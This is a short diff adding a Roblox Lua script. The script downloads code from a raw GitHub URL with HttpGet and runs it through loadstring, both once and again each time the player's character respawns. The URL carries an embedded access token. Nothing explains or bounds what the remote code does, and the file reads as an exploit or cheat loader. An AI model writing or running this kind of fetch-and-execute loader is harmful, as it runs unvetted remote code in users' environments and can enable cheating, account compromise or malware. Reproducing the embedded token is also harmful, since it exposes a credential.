@@ -1,0 +1,6 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/C1lone/wesdfgersfgerdgerg/main/poopy?token=GHSAT0AAAAAACMNAXP4G23HH7QEVQZK6AR6ZM4TXYA%22'))()
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/C1lone/wesdfgersfgerdgerg/main/poopy?token=GHSAT0AAAAAACMNAXP4G23HH7QEVQZK6AR6ZM4TXYA%22'))()
+end)
+--poopies-- 
